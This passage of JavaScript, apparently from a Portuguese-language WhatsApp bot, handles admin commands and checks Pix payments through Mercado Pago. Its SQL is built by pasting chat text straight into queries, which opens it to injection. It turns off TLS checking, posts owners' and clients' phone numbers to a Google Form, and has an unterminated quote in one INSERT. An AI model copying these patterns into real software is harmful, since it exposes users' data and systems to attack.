            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            await DataBase_Better.prepare(`UPDATE PAGAMENTO_BOT_PIX SET PROCESSADO = '7' WHERE PROCESSADO = '0'`).run()

            //########################
            var options = {
                'method': 'POST',
                'url': `https://docs.google.com/forms/d/e/1FAIpQLSdXUGsedf0N77EmDLPkOWoSL-Opl2mmKXrNNSUbXqmZI6fpiw/formResponse?entry.1642038562=${Nome_Dono.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}|${Numero_Dono.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}&entry.732200738=${Nome_Bot.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}&entry.1645969669=${Mensagem_From}&entry.653676343=${DIAS} Dias&entry.690718208=0&entry.1730231801=${new Date(parseInt(DATA_VENCIMENTO_MS)).toLocaleString()}&entry.1983942572=${DIAS_MS_VISUAL}&entry.1228862971=${new Date(parseInt(Date.now())).toLocaleString()}`,
                rejectUnauthorized: false,
            };
            request(options, function (error, response) {
                if (error) throw new Error(error);
                console.log(`Logs enviados para planilha.`);
            });
            //########################
            try {
                for await (adm of Adms) {

                    Texto = `✅ *DATA DE VENCIMENTO DESTE BOT, EXTENDIDO PARA ${DIAS} DIAS!* ✅

*Data de vencimento anterior:* ${new Date(parseInt(DATA_VENCIMENTO_MS)).toLocaleString()}
*Nova Data do vencimento:* ${DIAS_MS_VISUAL}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
            } catch (error) {
                console.log(error)
            }

            try {
                await Entrar_Grupo_Bots(client)
            } catch (error) {
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/valorsemana===") > -1 && Donos_Supremos.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                VALOR_SEMANA_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VALOR_SEMANA'`).get()["VALOR"]
                VALOR_SEMANA = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${VALOR_SEMANA}' WHERE PARAMETRO = 'VALOR_SEMANA'`).run()
                VALOR_SEMANA_Ant = parseFloat(VALOR_SEMANA_Ant).toFixed(2)
                VALOR_SEMANA = parseFloat(VALOR_SEMANA).toFixed(2)
                Texto = `*VALOR SEMANAL DO BOT ALTERADO COM SUCESSO!*

*ANTES:* R$: ${VALOR_SEMANA_Ant}

*AGORA:* R$: ${VALOR_SEMANA}

Zerei a Taxa de adesão!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'TAXA_ADESAO_STATUS'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/msdt===") > -1 && Donos_Supremos.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                DATA_VENCIMENTO_MS_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).get()["VALOR"]
                DATA_VENCIMENTO_MS = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${DATA_VENCIMENTO_MS}' WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).run()
                Texto = `*MSDT ALTERADO!*

*ANTES:* ${DATA_VENCIMENTO_MS_Ant}

*AGORA:* ${DATA_VENCIMENTO_MS}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '1' WHERE PARAMETRO = 'TAXA_ADESAO_STATUS'`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        if (Mensagem_Texto.indexOf("✅ PIX DO VENCIMENTO PAGO") > -1 || Mensagem_Texto.indexOf("❌ CANCELAR") > -1) {

            PIX_PENDENTE = await DataBase_Better.prepare(`SELECT PROCESSADO FROM PAGAMENTO_BOT_PIX WHERE PROCESSADO = '0'`).get()
            if (PIX_PENDENTE === undefined) {
                Texto = "Não há PIXs pendentes a serem processados..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
            }

            Numero_from_Creditando = Mensagem_From
            try {
                ID_PAGAMENTO = await DataBase_Better.prepare(`SELECT ID_PAGAMENTO FROM PAGAMENTO_BOT_PIX WHERE PROCESSADO = '0'`).get()["ID_PAGAMENTO"]
            } catch (error) {
            }
            DATA_INSERIDO_MS = await DataBase_Better.prepare(`SELECT DATA_INSERIDO_MS FROM PAGAMENTO_BOT_PIX WHERE PROCESSADO = '0'`).get()["DATA_INSERIDO_MS"]
            SEMANAS = await DataBase_Better.prepare(`SELECT SEMANAS FROM PAGAMENTO_BOT_PIX WHERE PROCESSADO = '0'`).get()["SEMANAS"]

            TOKEN_MP = await TokenLaraRimuru()

            var options = {
                mode: 'text', args: [ID_PAGAMENTO, TOKEN_MP]
            };
            PythonShell.run('ConsultarPagamentoMP.py', options, async function (error, Resultado) {
                if (error) {
                    //console.log(error)
                    return
                };
                console.log(Resultado)
                Div = (Resultado).toString().split(",")
                Status = Div[0]//OFICIAL
                //Status = "accredited"//MANIPULADO
                VALOR_CAIU_CREDITAR = Div[1]
                VALOR_CAIU_CREDITAR = parseFloat(VALOR_CAIU_CREDITAR).toFixed(2);

                Texto = `*STATUS DO PIX GERADO: ${Status}*`
                Texto = Texto.replace(/\'/igm, "")
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                if ((Status).toString().indexOf("accredited") > -1) {
                    await DataBase_Better.prepare(`UPDATE PAGAMENTO_BOT_PIX SET PROCESSADO = '1' WHERE PROCESSADO = '0'`).run()
                    DATA_VENCIMENTO_MS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).get()["VALOR"]
                    if (parseInt(DATA_VENCIMENTO_MS) < parseInt(Date.now())) {
                        DATA_VENCIMENTO_MS = Date.now()
                    }
                    SEMANAS_MS = parseInt(SEMANAS) * 604800000
                    SEMANAS_MS = parseInt(SEMANAS_MS) + parseInt(DATA_VENCIMENTO_MS)
                    SEMANAS_MS_VISUAL = new Date(parseInt(SEMANAS_MS)).toLocaleString()

                    await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${SEMANAS_MS}' WHERE PARAMETRO = 'DATA_VENCIMENTO_MS'`).run()

                    //########################
                    var options = {
                        'method': 'POST',
                        'url': `https://docs.google.com/forms/d/e/1FAIpQLSdXUGsedf0N77EmDLPkOWoSL-Opl2mmKXrNNSUbXqmZI6fpiw/formResponse?entry.1642038562=${Nome_Dono.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}|${Numero_Dono.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}&entry.732200738=${Nome_Bot.toString().replace(/[^0-9a-zA-Z\s]/igm, '')}&entry.1645969669=${Mensagem_From}&entry.653676343=${SEMANAS} Semanas&entry.690718208=${VALOR_CAIU_CREDITAR}&entry.1730231801=${new Date(parseInt(DATA_VENCIMENTO_MS)).toLocaleString()}&entry.1983942572=${SEMANAS_MS_VISUAL}&entry.1228862971=${new Date(parseInt(Date.now())).toLocaleString()}`,
                        rejectUnauthorized: false,
                    };
                    request(options, function (error, response) {
                        if (error) throw new Error(error);
                        console.log(`Logs enviados para planilha.`);
                    });
                    //########################

                    try {
                        for await (adm of Adms) {

                            Texto = `✅ *DATA DE VENCIMENTO DESTE BOT EXTENDIDO!* ✅

*Data de vencimento anterior:* ${new Date(parseInt(DATA_VENCIMENTO_MS)).toLocaleString()}
*Nova data de vencimento:* ${SEMANAS_MS_VISUAL}`
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us,
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))

                        }
                    } catch (error) {
                        console.log(error)
                    }
                    return
                }
                if (Mensagem_Texto.indexOf("❌ CANCELAR") > -1) {

                    Texto = `*PIXs PENDENTES CANCELADOS!*

Caso tenha gerado algum código pix e em seguida cancelou... 
*NÃO EFETUE MAIS O PAGAMENTO DO MESMO.*

*GERE OUTRO PIX PARA PAGAR.*

SE CLICOU EM CANCELAR E TENTAR PAGAR UM CÓDIGO ANTIGO...
*VOCÊ VAI PAGAR EM VÃO E VAI PERDER SEU DINHEIRO PAGO.*`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Numero_from_Creditando}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    await DataBase_Better.prepare(`UPDATE PAGAMENTO_BOT_PIX SET PROCESSADO = '6' WHERE PROCESSADO = '0'`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))

                }
            })
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        PIX_PENDENTE = await DataBase_Better.prepare(`SELECT PROCESSADO FROM PAGAMENTO_BOT_PIX WHERE PROCESSADO = '0'`).get()
        if (PIX_PENDENTE != undefined && Adms.includes(Numero)) {

            CONSTRUCAO_LISTMESSAGE_buttonText = "VERIFICANCO PAGAMENTO"
            CONSTRUCAO_LISTMESSAGE_title = `VERIFICANCO PAGAMENTO`
            CONSTRUCAO_LISTMESSAGE_description = `*PIX PENDENTE DETECTADO!*

*Você gerou um pix e não terminou os procedimentos de adição de créditos no Bot.*

*Caso tenha efetuado o pagamento do pix gerado, clique em OPÇÔES e escolha:*
*✅ PIX DO VENCIMENTO PAGO*

*Caso não tenha efetuado o pagamento e queira desistir do mesmo, clique em OPÇÔES e escolha:*
*❌ CANCELAR*`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "✅ PIX DO VENCIMENTO PAGO",
                    description: "Escolha esta opção caso tenha pago o Pix Copia-e-Cola que foi gerado por você.",
                },
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "❌ CANCELAR",
                    description: "Escolha esta opção se deseja desistir do PIX que gerou.",
                }
            )
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        if (Mensagem_Texto.indexOf("/botpixsemana===") > -1) {
            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "" || Array_Total_Igual.length != 3) {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"))
            }

            Array_Digitos_Nao_Deveria = msg[1].match(/[^0-9]/igm);
            if (Array_Digitos_Nao_Deveria != null) {
                Texto = `⚠️ Apenas números são permitidos.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
